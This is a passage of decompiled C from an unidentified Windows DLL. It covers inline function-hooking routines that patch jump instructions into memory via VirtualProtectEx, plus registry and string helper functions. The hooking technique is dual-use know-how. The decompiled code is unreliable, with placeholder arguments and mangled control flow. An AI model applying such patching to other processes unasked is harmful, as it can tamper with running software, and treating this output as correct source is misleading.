                int32_t v30 = v26 + v15; // 0x100105f7
                uint32_t v31 = v15 + v5; // 0x100105fb
                uint32_t v32 = v30 + 5; // 0x100105fe
                int32_t v33 = v31 - v32;
                if ((v32 > v31 ? v32 - v31 : v33) < 0x7fff0001) {
                    // 0x1001061e
                    *(char *)v30 = -23;
                    *(int32_t *)(v30 + 1) = v33;
                } else {
                    int32_t v34 = v30 + 6; // 0x1001062b
                    *(int16_t *)v30 = 0x25ff;
                    *(int32_t *)(v30 + 2) = v34;
                    *(int32_t *)v34 = v31;
                }
                int32_t v35 = v23; // 0x1001064e
                if ((v6 >= v5 ? v6 - v5 : v5 - v6) >= 0x7fff0001) {
                    // 0x10010650
                    *(int32_t *)(v2 - 48) = -12 - v16 + function_1000ff80();
                    *(int32_t *)(v2 - 52) = v16 + 12;
                    v35 = v2 - 56;
                    *(int32_t *)v35 = processHandle;
                    FlushInstructionCache(&g173, &g173, (int32_t)&g173);
                }
                // 0x1001066f
                function_1000ff80();
                *(int32_t *)(v35 - 4) = v15;
                *(int32_t *)(v35 - 8) = v26;
                *(int32_t *)(v35 - 12) = processHandle;
                *(int32_t *)(v16 + 4) = v15;
                *(int32_t *)v16 = v5;
                *(int32_t *)(v16 + 8) = v6;
                FlushInstructionCache(&g173, &g173, (int32_t)&g173);
                *(int32_t *)(v35 - 16) = v22;
                *(int32_t *)(v35 - 20) = lpAddress;
                *(int32_t *)(v35 - 24) = 108;
                *(int32_t *)(v35 - 28) = v16;
                v25 = v35 - 32;
                *(int32_t *)v25 = processHandle;
                VirtualProtectEx(&g173, &g173, (int32_t)&g173, (int32_t)&g173, &g173);
            }
            // 0x100106a5
            *(int32_t *)(v25 - 4) = v15;
            *(int32_t *)(v25 - 8) = v5;
            *(int32_t *)(v25 - 12) = processHandle;
            FlushInstructionCache(&g173, &g173, (int32_t)&g173);
            *(int32_t *)(v25 - 16) = v19;
            *(int32_t *)(v25 - 20) = hProcess;
            *(int32_t *)(v25 - 24) = v15;
            *(int32_t *)(v25 - 28) = v5;
            v21 = v25 - 32;
            *(int32_t *)v21 = processHandle;
            VirtualProtectEx(&g173, &g173, (int32_t)&g173, (int32_t)&g173, &g173);
        }
        int32_t v36 = 0; // 0x100106c8
        if (*(int32_t *)v16 == 0) {
            int32_t * v37 = (int32_t *)(4 * v36 + (int32_t)&g82);
            while (*v37 != v16) {
                int32_t v38 = v36 + 1; // 0x100106df
                v36 = v38;
                v17 = v21;
                v18 = 0;
                if (v38 >= 64) {
                    goto lab_0x10010708;
                }
                v37 = (int32_t *)(4 * v36 + (int32_t)&g82);
            }
            // 0x100106e7
            *(int32_t *)(v21 - 4) = 0x8000;
            *(int32_t *)(v21 - 8) = 0;
            int32_t v39 = v21 - 12; // 0x100106ee
            *(int32_t *)v39 = v16;
            *v37 = 0;
            VirtualFree(&g173, (int32_t)&g173, (int32_t)&g173);
            g84--;
            v17 = v39;
            v18 = 0;
        } else {
            // 0x100106ca
            *a1 = v16 + 44;
            v17 = v21;
            v18 = v16;
        }
    }
  lab_0x10010708:
    // 0x10010708
    function_100101e0();
    // 0x1001070d
    *(int32_t *)(v17 - 4) = (int32_t)&g81;
    LeaveCriticalSection((struct _RTL_CRITICAL_SECTION *)&g173);
    return v18 != 0;
}

// Address range: 0x10010730 - 0x1001087d
int32_t function_10010730(int32_t * a1) {
    // 0x10010730
    int32_t v1; // bp-16, 0x10010730
    int32_t v2 = &v1; // 0x10010742
    if (g83 == 0) {
        struct _RTL_CRITICAL_SECTION * v3 = (struct _RTL_CRITICAL_SECTION *)&g81; // bp-20, 0x10010744
        InitializeCriticalSection((struct _RTL_CRITICAL_SECTION *)&g81);
        _memset(&g82, 0, 256);
        g83 = 1;
        v2 = (int32_t)&v3;
    }
    // 0x1001076c
    *(int32_t *)(v2 - 4) = (int32_t)&g81;
    EnterCriticalSection((struct _RTL_CRITICAL_SECTION *)&g173);
    int32_t * v4; // 0x10010730
    int32_t v5; // 0x10010730
    int32_t v6; // 0x10010730
    int32_t v7; // 0x10010730
    int32_t v8; // 0x10010730
    int32_t v9; // 0x10010730
    int32_t result; // 0x10010730
    int32_t hProcess; // bp-8, 0x10010730
    int32_t processHandle; // 0x100107cd
    int32_t * v10; // 0x100107d3
    int32_t v11; // 0x100107d9
    int32_t v12; // 0x100107f2
    int32_t v13; // 0x100107af
    int32_t * v14; // 0x100107be
    for (int32_t i = 0; i < 64; i++) {
        int32_t * v15 = (int32_t *)(4 * i + (int32_t)&g82);
        int32_t v16 = *v15; // 0x10010780
        if (v16 != 0) {
            // 0x1001078b
            if (v16 + 44 == *a1) {
                // 0x100107ae
                v13 = *v15;
                v4 = (int32_t *)(v2 - 8);
                result = 0;
                if (v13 == 0) {
                    goto lab_0x10010869;
                } else {
                    // 0x100107be
                    v14 = (int32_t *)v13;
                    int32_t * v17 = (int32_t *)(v2 - 16); // 0x100107c4
                    *v17 = *v14;
                    function_10010270((int32_t)&g173);
                    processHandle = (int32_t)GetCurrentProcess();
                    v10 = (int32_t *)(v13 + 4);
                    v11 = &hProcess;
                    *v17 = v11;
                    *(int32_t *)(v2 - 20) = 64;
                    *(int32_t *)(v2 - 24) = *v10;
                    *(int32_t *)(v2 - 28) = *v14;
                    hProcess = 0;
                    int32_t v18 = v2 - 32; // 0x100107eb
                    *(int32_t *)v18 = processHandle;
                    bool v19 = VirtualProtectEx((int32_t *)hProcess, &g173, (int32_t)&g173, (int32_t)&g173, &g173); // 0x100107ec
                    v9 = 0;
                    v8 = v18;
                    if (!v19) {
                        goto lab_0x10010863;
                    } else {
                        // 0x100107f2
                        v12 = *v14;
                        v5 = v12;
                        v6 = 0;
                        if (*v10 == 0) {
                            goto lab_0x1001080d;
                        } else {
                            // 0x10010800
                            v7 = 0;
                            goto lab_0x10010800_2;
                        }
                    }
                }
            }
        }
    }
    // 0x1001079b
    *(int32_t *)(v2 - 8) = (int32_t)&g81;
    LeaveCriticalSection((struct _RTL_CRITICAL_SECTION *)&g173);
    return 0;
  lab_0x10010869:
    // 0x10010869
    *v4 = (int32_t)&g81;
    LeaveCriticalSection((struct _RTL_CRITICAL_SECTION *)&g173);
    return result;
  lab_0x10010863:
    // 0x10010863
    function_100101e0();
    v4 = (int32_t *)(v8 + 4);
    result = v9;
    goto lab_0x10010869;
  lab_0x1001080d:
    // 0x1001080d
    *(int32_t *)(v2 - 36) = v6;
    *(int32_t *)(v2 - 40) = v5;
    *(int32_t *)(v2 - 44) = processHandle;
    FlushInstructionCache(&g173, &g173, (int32_t)&g173);
    *(int32_t *)(v2 - 48) = v11;
    *(int32_t *)(v2 - 52) = hProcess;
    *(int32_t *)(v2 - 56) = *v10;
    *(int32_t *)(v2 - 60) = *v14;
    int32_t v20 = v2 - 64; // 0x1001082a
    *(int32_t *)v20 = processHandle;
    VirtualProtectEx(&g173, &g173, (int32_t)&g173, (int32_t)&g173, &g173);
    *a1 = *v14;
    int32_t v21 = 0; // 0x1001083e
    goto lab_0x10010840;
  lab_0x10010840:;
    int32_t * v22 = (int32_t *)(4 * v21 + (int32_t)&g82);
    if (*v22 == v13) {
        // 0x10010852
        g84--;
        *v22 = 0;
        v9 = 1;
        v8 = v20;
        goto lab_0x10010863;
    } else {
        int32_t v23 = v21 + 1; // 0x10010849
        v21 = v23;
        v9 = 1;
        v8 = v20;
        if (v23 < 64) {
            goto lab_0x10010840;
        } else {
            goto lab_0x10010863;
        }
    }
  lab_0x10010800_2:;
    int32_t v24 = v7;
    *(char *)(v24 + v12) = *(char *)(v13 + 76 + v24);
    int32_t v25 = v24 + 1; // 0x10010807
    uint32_t v26 = *v10; // 0x10010808
    v7 = v25;
    if (v25 < v26) {
        goto lab_0x10010800_2;
    } else {
        // 0x1001080d
        v5 = *v14;
        v6 = v26;
        goto lab_0x1001080d;
    }
}

// Address range: 0x10010880 - 0x100108af
int32_t function_10010880(int32_t a1, int32_t a2, int32_t lpString) {
    int32_t v1 = lstrlenW((int16_t *)lpString); // 0x10010888
    return _memcpy_s((int32_t *)a1, 2 * a2, (int32_t *)lpString, 2 * v1 + 2) == 0;
}

// Address range: 0x100108b0 - 0x100108d0
int32_t function_100108b0(int32_t a1) {
    int32_t v1 = a1;
    int32_t v2; // 0x100108b0
    __CxxThrowException_40_8(&v1, &g42, v2, a1);
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    return __asm_int3();
}

// Address range: 0x100108d0 - 0x1001091e
int32_t function_100108d0(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    int32_t v1 = a4; // bp-8, 0x100108dc
    int32_t v2 = _memcpy_s((int32_t *)a1, a2, (int32_t *)a3, a4); // 0x100108e3
    g148 = v2;
    int32_t v3; // bp-4, 0x100108d0
    int32_t v4 = &v3; // 0x100108e8
    int32_t v5 = v4; // 0x100108f7
    int32_t v6 = v4; // 0x100108f7
    int32_t result = v2; // 0x100108f7
    switch (v2) {
        case 12: {
            // 0x100108fe
            v1 = -0x7ff8fff2;
            function_100108b0(-0x7ff8fff2);
            v5 = &v1;
        }
        case 22: {
        }
        case 34: {
            // 0x10010908
            v6 = v5 - 4;
            *(int32_t *)v6 = -0x7ff8ffa9;
            function_100108b0((int32_t)&g173);
        }
        default: {
            // 0x10010912
            *(int32_t *)(v6 - 4) = -0x7fffbffb;
            result = function_100108b0((int32_t)&g173);
        }
        case 0: {
        }
        case 80: {
            // 0x1001091c
            return result;
        }
    }
}

// Address range: 0x10010990 - 0x100109de
int32_t function_10010990(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    int32_t v1 = a4; // bp-8, 0x1001099c
    int32_t v2 = _wcsncpy_s((int16_t *)a1, a2, (int16_t *)a3, a4); // 0x100109a3
    g174 = v2;
    int32_t v3; // bp-4, 0x10010990
    int32_t v4 = &v3; // 0x100109a8
    int32_t v5 = v4; // 0x100109b7
    int32_t v6 = v4; // 0x100109b7
    int32_t result = v2; // 0x100109b7
    switch (v2) {
        case 12: {
            // 0x100109be
            v1 = -0x7ff8fff2;
            function_100108b0(-0x7ff8fff2);
            v5 = &v1;
        }
        case 22: {
        }
        case 34: {
            // 0x100109c8
            v6 = v5 - 4;
            *(int32_t *)v6 = -0x7ff8ffa9;
            function_100108b0((int32_t)&g173);
        }
        default: {
            // 0x100109d2
            *(int32_t *)(v6 - 4) = -0x7fffbffb;
            result = function_100108b0((int32_t)&g173);
        }
        case 0: {
        }
        case 80: {
            // 0x100109dc
            return result;
        }
    }
}

// Address range: 0x10010a50 - 0x10010a79
int32_t function_10010a50(void) {
    // 0x10010a50
    int32_t lpCriticalSection; // 0x10010a50
    if (InitializeCriticalSectionAndSpinCount((struct _RTL_CRITICAL_SECTION *)lpCriticalSection, 0)) {
        // 0x10010a77
        return 0;
    }
    int32_t errorCode = GetLastError(); // 0x10010a5f
    if (errorCode < 1) {
        // 0x10010a77
        return errorCode;
    }
    // 0x10010a69
    return errorCode & 0xffff | -0x7ff90000;
}

// Address range: 0x10010a80 - 0x10010a95
int32_t function_10010a80(void) {
    int32_t errorCode = GetLastError(); // 0x10010a80
    return errorCode < 1 ? errorCode : errorCode & 0xffff | -0x7ff90000;
}

// Address range: 0x10010aa0 - 0x10010ab6
int32_t function_10010aa0(int32_t a1) {
    // 0x10010aa0
    return a1 < 1 ? a1 : a1 & 0xffff | -0x7ff90000;
}

// Address range: 0x10010ac0 - 0x10010b32
int32_t function_10010ac0(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t * a8, int32_t * a9, int32_t a10, int32_t a11, int32_t a12, int32_t a13) {
    // 0x10010ac0
    int32_t v1; // 0x10010ac0
    if (v1 == 0) {
        // 0x10010b1a
        if (*(int32_t *)4 == 0) {
            // 0x10010b28
            return 1;
        }
        // 0x10010b20
        int32_t hKey; // 0x10010ac0
        int32_t lpSubKey; // 0x10010ac0
        int32_t result = RegCreateKeyExW((int32_t *)hKey, (int16_t *)lpSubKey, (int32_t)&g173, (int16_t *)&g173, (int32_t)&g173, (int32_t)&g173, (struct _SECURITY_ATTRIBUTES *)&g173, (int32_t **)&g173, &g173); // 0x10010b22
        return result;
    }
    int32_t * hModule = GetModuleHandleW(L"Advapi32.dll"); // 0x10010ad0
    if (hModule == NULL) {
        // 0x10010b28
        return 1;
    }
    int32_t (*func)() = GetProcAddress(hModule, "RegCreateKeyTransactedW"); // 0x10010ae0
    if (func != NULL) {
        // 0x10010aea
        return (int32_t)func;
    }
    // 0x10010b28
    return 1;
}

// Address range: 0x10010b40 - 0x10010b9a
int32_t function_10010b40(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x10010b40
    int32_t v1; // 0x10010b40
    if (v1 == 0) {
        // 0x10010b82
        if (*(int32_t *)4 != 0) {
            // 0x10010b88
            int32_t hKey; // 0x10010b40
            int32_t lpSubKey; // 0x10010b40
            return RegDeleteKeyW((int32_t *)hKey, (int16_t *)lpSubKey);
        }
        // 0x10010b90
        return 1;
    }
    int32_t * hModule = GetModuleHandleW(L"Advapi32.dll"); // 0x10010b50
    if (hModule == NULL) {
        // 0x10010b90
        return 1;
    }
    int32_t (*func)() = GetProcAddress(hModule, "RegDeleteKeyTransactedW"); // 0x10010b60
    if (func != NULL) {
        // 0x10010b6a
        return (int32_t)func;
    }
    // 0x10010b90
    return 1;
}

// Address range: 0x10010ba0 - 0x10010bf5
int32_t function_10010ba0(int32_t a1, int32_t a2, int32_t a3) {
    if (a2 == 0) {
        // 0x10010bf3
        int32_t result; // 0x10010ba0
        return result;
    }
    uint32_t v1 = a2 - 1; // 0x10010bac
    int32_t v2 = 0; // 0x10010bb6
    int32_t v3 = a3; // 0x10010bb6
    if (v1 == 0) {
        // 0x10010bec
        *(int16_t *)a1 = 0;
        // 0x10010bf3
        return 0;
    }
    int32_t v4 = a1;
    int16_t * v5 = (int16_t *)v3; // 0x10010bc0
    int16_t v6 = *v5; // 0x10010bc0
    int32_t v7 = v4; // 0x10010bc6
    while (v6 != 0) {
        int32_t v8 = v2;
        *(int16_t *)v4 = v6;
        int32_t v9 = v4 + 2; // 0x10010bcb
        int32_t v10 = v8; // 0x10010bd2
        int32_t v11 = v9; // 0x10010bd2
        if (*v5 == 39) {
            int32_t v12 = v8 + 1; // 0x10010bd4
            v10 = v12;
            v11 = v9;
            if (v12 < v1) {
                // 0x10010bd9
                *(int16_t *)v9 = 39;
                v10 = v12;
                v11 = v4 + 4;
            }
        }
        // 0x10010be4
        v2 = v10 + 1;
        v3 += 2;
        v7 = v11;
        if (v2 >= v1) {
            // break -> 0x10010bec
            break;
        }
        v4 = v11;
        v5 = (int16_t *)v3;
        v6 = *v5;
        v7 = v4;
    }
    // 0x10010bec
    *(int16_t *)v7 = 0;
    // 0x10010bf3
    return 0;
}

// Address range: 0x10010c00 - 0x10010c7a
int32_t function_10010c00(int32_t a1) {
    // 0x10010c00
    int32_t v1; // 0x10010c00
    int32_t v2 = *(int32_t *)(v1 + 8); // 0x10010c06
    int32_t ** v3; // bp-12, 0x10010c00
    if (v2 != 0) {
        // 0x10010c0d
        v3 = (int32_t **)a1;
        int32_t v4; // 0x10010c00
        int32_t v5; // 0x10010c00
        return function_10010b40(v2, a1, v4, v5);
    }
    // 0x10010c1e
    int32_t v6; // bp-8, 0x10010c00
    int32_t v7 = &v6; // 0x10010c25
    if (g100 == 0) {
        // 0x10010c27
        v3 = (int32_t **)L"Advapi32.dll";
        int32_t * hModule = GetModuleHandleW(L"Advapi32.dll"); // 0x10010c2c
        v7 = (int32_t)&v3;
        if (hModule != NULL) {
            int32_t v8 = (int32_t)hModule; // bp-20, 0x10010c3b
            g99 = (int32_t)GetProcAddress(hModule, "RegDeleteKeyExW");
            v7 = &v8;
        }
        // 0x10010c47
        g100 = 1;
    }
    // 0x10010c4e
    if (g99 == 0) {
        // 0x10010c6b
        *(int32_t *)(v7 - 4) = a1;
        *(int32_t *)(v7 - 8) = 0;
        return RegDeleteKeyW(&g173, (int16_t *)&g173);
    }
    int32_t v9 = *(int32_t *)(v1 + 4); // 0x10010c5a
    *(int32_t *)(v7 - 4) = 0;
    *(int32_t *)(v7 - 8) = v9;
    *(int32_t *)(v7 - 12) = a1;
    *(int32_t *)(v7 - 16) = v9;
    return g99;
}

// Address range: 0x10010c80 - 0x10010ca6
int32_t function_10010c80(void) {
    // 0x10010c80
    int32_t v1; // 0x10010c80
    if (v1 == 0) {
        // 0x10010ca1
        *(int32_t *)4 = 0;
        return 0;
    }
    int32_t * hKey = (int32_t *)v1; // 0x10010c8c
    int32_t result = RegCloseKey(hKey); // 0x10010c8c
    *hKey = 0;
    *(int32_t *)(v1 + 4) = 0;
    return result;
}

// Address range: 0x10010cb0 - 0x10010d4a
int32_t function_10010cb0(int32_t hKey, int32_t lpSubKey, int32_t lpClass, int32_t dwOptions, int32_t samDesired, int32_t lpSecurityAttributes, int32_t hKey2) {
    int32_t lpdwDisposition = lpSecurityAttributes;
    int32_t phkResult = 0; // bp-8, 0x10010cbe
    int32_t result; // 0x10010cb0
    int32_t v1; // 0x10010cb0
    if (*(int32_t *)(v1 + 8) == 0) {
        int32_t v2 = RegCreateKeyExW((int32_t *)hKey, (int16_t *)lpSubKey, 0, (int16_t *)lpClass, dwOptions, samDesired, (struct _SECURITY_ATTRIBUTES *)lpSecurityAttributes, (int32_t **)&phkResult, &lpdwDisposition); // 0x10010d0b
        result = v2;
    } else {
        // 0x10010ccc
        int32_t v3; // 0x10010cb0
        int32_t v4; // 0x10010cb0
        int32_t v5; // 0x10010cb0
        int32_t v6 = function_10010ac0(hKey, lpSubKey, 0, lpClass, dwOptions, samDesired, lpSecurityAttributes, &phkResult, &lpdwDisposition, v3, v4, 0, v5); // 0x10010ce8
        result = v6;
    }
    // 0x10010d11
    if (hKey2 != 0) {
        // 0x10010d18
        *(int32_t *)hKey2 = lpdwDisposition;
    }
    // 0x10010d1d
    if (result != 0) {
        // 0x10010d42
        return result;
    }
    int32_t * v7; // 0x10010cb0
    int32_t result2; // 0x10010cb0
    if (hKey2 == 0) {
        // 0x10010d21
        v7 = (int32_t *)v1;
        result2 = result;
    } else {
        int32_t v8 = RegCloseKey((int32_t *)hKey2); // 0x10010d28
        int32_t * v9 = (int32_t *)v1;
        *v9 = 0;
        v7 = v9;
        result2 = v8;
    }
    // 0x10010d34
    *v7 = phkResult;
    *(int32_t *)(v1 + 4) = samDesired & 768;
    // 0x10010d42
    return result2;
}

// Address range: 0x10010d50 - 0x10010dfd
int32_t function_10010d50(int32_t hKey, int32_t lpSubKey, int32_t samDesired) {
    // 0x10010d50
    int32_t v1; // 0x10010d50
    int32_t v2 = *(int32_t *)(v1 + 8); // 0x10010d58
    int32_t phkResult = 0; // bp-8, 0x10010d5f
    int32_t result; // 0x10010d50
    int32_t * v3; // 0x10010d50
    int32_t v4; // bp-40, 0x10010d50
    if (v2 == 0) {
        goto lab_0x10010dba;
    } else {
        int32_t * v5 = (int32_t *)v2; // 0x10010d6a
        if (*v5 == 0) {
            // 0x10010dad
            if (*(int32_t *)(v2 + 4) == 0) {
                // 0x10010df4
                return 1;
            }
            goto lab_0x10010dba;
        } else {
            int32_t * hModule = GetModuleHandleW(L"Advapi32.dll"); // 0x10010d74
            if (hModule == NULL) {
                // 0x10010df4
                return 1;
            }
            int32_t (*func)() = GetProcAddress(hModule, "RegOpenKeyTransactedW"); // 0x10010d8b
            if (func == NULL) {
                // 0x10010df4
                return 1;
            }
            // 0x10010d95
            v4 = *v5;
            int32_t v6 = hKey; // bp-60, 0x10010da8
            result = (int32_t)func;
            v3 = &v6;
            goto lab_0x10010dcf;
        }
    }
  lab_0x10010dba:
    // 0x10010dba
    v4 = hKey;
    int32_t v7 = RegOpenKeyExW((int32_t *)hKey, (int16_t *)lpSubKey, 0, samDesired, (int32_t **)&phkResult); // 0x10010dc9
    result = v7;
    v3 = &v4;
    goto lab_0x10010dcf;
  lab_0x10010dcf:
    // 0x10010dcf
    if (result != 0) {
        // 0x10010df4
        return result;
    }
    int32_t * v8; // 0x10010d50
    int32_t result2; // 0x10010d50
    if (lpSubKey == 0) {
        // 0x10010dd3
        v8 = (int32_t *)v1;
        result2 = result;
    } else {
        // 0x10010dd9
        *(int32_t *)((int32_t)v3 - 4) = lpSubKey;
        int32_t v9 = RegCloseKey(&g173); // 0x10010dda
        int32_t * v10 = (int32_t *)v1;
        *v10 = 0;
        v8 = v10;
        result2 = v9;
    }
    // 0x10010de6
    *v8 = phkResult;
    *(int32_t *)(v1 + 4) = samDesired & 768;
    // 0x10010df4
    return result2;
}

// Address range: 0x10010e00 - 0x10010e1e
int32_t function_10010e00(int32_t lpValueName, int32_t a2) {
    // 0x10010e00
    int32_t lpData; // 0x10010e00
    int32_t hKey; // 0x10010e00
    int32_t result = RegSetValueExW((int32_t *)hKey, (int16_t *)lpValueName, 0, 4, (char *)&lpData, 4); // 0x10010e14
    return result;
}

// Address range: 0x10010e20 - 0x10010e5d
int32_t function_10010e20(int32_t lpValueName, int32_t * lpString, int32_t hKey) {
    if (lpString == NULL) {
        // 0x10010e2e
        return (int32_t)lpString + 13;
    }
    // 0x10010e37
    return RegSetValueExW((int32_t *)hKey, (int16_t *)lpValueName, 0, hKey, (char *)lpString, 2 * lstrlenW((int16_t *)lpString) + 2);
}

// Address range: 0x10010e60 - 0x10010eb4
int32_t function_10010e60(int32_t a1, int32_t a2) {
    if (a2 == 0) {
        // 0x10010e6f
        return a2 + 13;
    }
    int32_t v1 = a2; // 0x10010e81
    int32_t v2 = 0; // 0x10010e81
    int32_t v3; // bp-20, 0x10010e60
    int32_t v4 = &v3;
    int32_t v5 = v4 - 4; // 0x10010e83
    *(int32_t *)v5 = v1;
    int32_t v6 = lstrlenW((int16_t *)&g173); // 0x10010e84
    int32_t v7 = 2 * v6 + 2; // 0x10010e87
    v2 += v7;
    v1 += v7;
    while (v6 != 0) {
        // 0x10010e83
        v4 = v5;
        v5 = v4 - 4;
        *(int32_t *)v5 = v1;
        v6 = lstrlenW((int16_t *)&g173);
        v7 = 2 * v6 + 2;
        v2 += v7;
        v1 += v7;
    }
    // 0x10010e92
    *(int32_t *)(v4 - 8) = v2;
    *(int32_t *)(v4 - 12) = a2;
    *(int32_t *)(v4 - 16) = 7;
    *(int32_t *)(v4 - 20) = 0;
    *(int32_t *)(v4 - 24) = a1;
    *(int32_t *)(v4 - 28) = a1;
    int32_t result = RegSetValueExW(&g173, (int16_t *)&g173, (int32_t)&g173, (int32_t)&g173, (char *)&g173, (int32_t)&g173); // 0x10010ea5
    return result;
}

// Address range: 0x10010ec0 - 0x10010ee6
int32_t function_10010ec0(void) {
    // 0x10010ec0
    int32_t lpsz; // 0x10010ec0
    if ((int16_t)lpsz == 39) {
        // 0x10010ecc
        if (*CharNextW((int16_t *)lpsz) != 39) {
            // 0x10010edd
            return 1;
        }
    }
    // 0x10010edd
    return 0;
}

// Address range: 0x10010ef0 - 0x10010efb
void function_10010ef0(int32_t * pv) {
    // 0x10010ef0
    CoTaskMemFree(pv);
}

// Address range: 0x10010f00 - 0x10010faa
int32_t function_10010f00(int32_t a1, int32_t a2) {
    // 0x10010f00
    int32_t v1; // 0x10010f00
    int32_t v2 = a2 + 1 + v1; // 0x10010f0c
    if (v2 > v1 != v2 > a2) {
        // 0x10010fa2
        return 0;
    }
    int32_t * v3 = (int32_t *)(v1 + 4); // 0x10010f20
    int32_t v4 = *v3;
    int32_t v5; // 0x10010f00
    int32_t v6; // 0x10010f00
    int32_t * v7; // 0x10010f00
    if (v2 >= v4) {
        int32_t v8 = v4; // 0x10010f25
        while (v8 <= 0x3fffffff) {
            int32_t v9 = 2 * v8; // 0x10010f2f
            *v3 = v9;
            if (v2 < v9) {
                if ((v8 & 0x40000000) != 0) {
                    return 0;
                }
                int32_t * v10 = (int32_t *)(v1 + 8); // 0x10010f38
                int32_t v11 = *v10; // 0x10010f38
                int32_t v12 = v11; // bp-20, 0x10010f4f
                int32_t * v13 = CoTaskMemRealloc((int32_t *)v11, 4 * v8); // 0x10010f50
                if (v13 == NULL) {
                    return 0;
                }
                // 0x10010f5d
                *v10 = (int32_t)v13;
                v5 = *v3;
                v7 = &v12;
                v6 = 0;
                goto lab_0x10010f63;
            }
            v8 = v9;
        }
        // 0x10010fa2
        return 0;
    }
    // 0x10010f5d
    v5 = v4;
    int32_t v14; // bp-12, 0x10010f00
    v7 = &v14;
    v6 = v2;
    if (v2 < 0) {
        // 0x10010fa2
        return 0;
    }
    goto lab_0x10010f63;
  lab_0x10010f63:
    // 0x10010f63
    if (v5 <= v6) {
        // 0x10010fa2
        return 0;
    }
    uint32_t v15 = v5 - v6; // 0x10010f6c
    if (v15 > v5) {
        // 0x10010fa2
        return 0;
    }
    int32_t v16 = (int32_t)v7;
    *(int32_t *)(v16 - 4) = 2 * a2;
    *(int32_t *)(v16 - 8) = a1;
    int32_t * v17 = (int32_t *)(v1 + 8); // 0x10010f7a
    int32_t v18 = 2 * v15; // 0x10010f7d
    *(int32_t *)(v16 - 12) = v18;
    *(int32_t *)(v16 - 16) = *v17 + 2 * v6;
    function_100108d0((int32_t)&g173, (int32_t)&g173, (int32_t)&g173, (int32_t)&g173);
    *(int32_t *)v1 = v18 + a2;
    *(int16_t *)(*v17 + 4 * v15) = 0;
    return 1;
}

// Address range: 0x10010fe0 - 0x1001108b
int32_t function_10010fe0(int32_t * a1, int32_t * a2) {
    // 0x10010fe0
    if ((g109 & 1) == 0) {
        // 0x10010fec
        g109 |= 1;
        *(int16_t *)&g102 = 8;
        g101 = &g9;
        g103 = &g8;
        *(int16_t *)&g104 = 0x4008;
        g105 = &g7;
        *(int16_t *)&g106 = 19;
        g107 = &g6;
        *(int16_t *)&g108 = 17;
    }
    // 0x10011049
    int32_t v1; // bp-16, 0x10010fe0
    int32_t v2 = &v1; // 0x10011055
    int32_t v3 = 0; // 0x10011055
    int32_t v4 = 8 * v3; // 0x10011057
    int32_t v5 = *(int32_t *)(v4 + (int32_t)&g101); // 0x10011057
    *(int32_t *)(v2 - 4) = v5;
    v2 -= 8;
    *(int32_t *)v2 = (int32_t)a1;
    while (lstrcmpiW((int16_t *)&g173, (int16_t *)&g173) != 0) {
        // 0x10011066
        v3++;
        if (v3 >= 4) {
            // 0x1001106c
            return 0;
        }
        v4 = 8 * v3;
        v5 = *(int32_t *)(v4 + (int32_t)&g101);
        *(int32_t *)(v2 - 4) = v5;
        v2 -= 8;
        *(int32_t *)v2 = (int32_t)a1;
    }
    // 0x10011073
    *(int16_t *)a2 = *(int16_t *)(v4 + (int32_t)&g102);
    return 1;
}

// Address range: 0x10011090 - 0x100110bb
int32_t function_10011090(int32_t a1, int32_t a2) {
    int32_t v1 = 0x10000 * a2 / 0x10000;
    int16_t v2 = v1; // 0x10011093
    g176 = v2;
    int32_t v3 = v1 & 0xffff; // 0x10011093
    int32_t v4 = v3 - 48; // 0x10011097
    int32_t result = v4; // 0x100110a6
    switch (v2) {
        case 0: {
        }
        case 1: {
        }
        case 2: {
        }
        case 3: {
        }
        case 4: {
        }
        case 5: {
            // 0x100110ad
            return v3 - 55;
        }
        default: {
            // 0x100110b7
            result = v4 & -256;
        }
        case 6: {
        }
        case 7: {
        }
        case 8: {
        }
        case 9: {
        }
        case 10: {
        }
        case 11: {
        }
        case 12: {
            // 0x100110b9
            return result;
        }
    }
}

// Address range: 0x10011110 - 0x10011154
int32_t function_10011110(int32_t result, int32_t a2) {
    // 0x10011110
    if (result == 0) {
        // 0x1001111d
        return result;
    }
    int16_t v1 = *(int16_t *)result; // 0x10011120
    if (v1 == 0) {
        // 0x1001111d
        return 0;
    }
    int32_t v2 = result; // 0x10011130
    int16_t v3 = v1; // 0x10011130
    int32_t v4; // bp-16, 0x10011110
    int32_t v5 = &v4; // 0x10011130
    int32_t result2 = v2; // 0x10011137
    while (v3 != (int16_t)a2) {
        // 0x10011139
        v5 -= 4;
        *(int32_t *)v5 = v2;
        int16_t * v6 = CharNextW((int16_t *)&g173); // 0x1001113a
        v3 = *v6;
        result2 = 0;
        v2 = (int32_t)v6;
        if (v3 == 0) {
            // break -> 0x1001111d
            break;
        }
        result2 = v2;
    }
    // 0x1001111d
    return result2;
}

// Address range: 0x10011160 - 0x10011195
int32_t function_10011160(void) {
    // 0x10011160
    int32_t v1; // bp-8, 0x10011160
    int32_t v2 = &v1; // 0x1001116a
    int32_t v3; // 0x10011160
    int32_t result; // 0x10011160
    while (true) {
      lab_0x10011170:
        // 0x10011170
        result = v3;
        int16_t v4 = result;
        g170 = v4;
        switch (v4) {
            case 0: {
                goto lab_0x1001118b;
            }
            case 3: {
                goto lab_0x1001118b;
            }
            case 4: {
                goto lab_0x1001118b;
            }
            case 7: {
                goto lab_0x1001118b;
            }
            default: {
                return result;
            }
        }
    }
    // 0x10011192
    return result;
  lab_0x1001118b:
    // 0x1001118b
    v2 -= 4;
    *(int32_t *)v2 = result;
    int32_t v5; // 0x10011160
    *(int32_t *)v5 = (int32_t)CharNextW((int16_t *)&g173);
    v3 = (int32_t)*(char *)((result & 0xffff) + 0x10011197);
    goto lab_0x10011170;
}

// Address range: 0x100111c0 - 0x10011310
int32_t function_100111c0(int32_t a1) {
    // 0x100111c0
    function_10011160();
    int32_t v1; // 0x100111c0
    int16_t v2 = v1;
    if (v2 == 0) {
        // 0x100111d7
        return -0x7ffdfff7;
    }
    int32_t v3; // 0x100111c0
    if (v2 != 39) {
        // 0x100112a0
        int32_t v4; // bp-16, 0x100111c0
        int32_t v5 = &v4; // 0x100112bb
        int32_t v6 = a1;
        g159 = v2;
        int32_t v7 = v6; // 0x100112b4
        switch (v2) {
            case 0: {
            }
            case 3: {
            }
            case 4: {
            }
            case 7: {
                // 0x100112f6
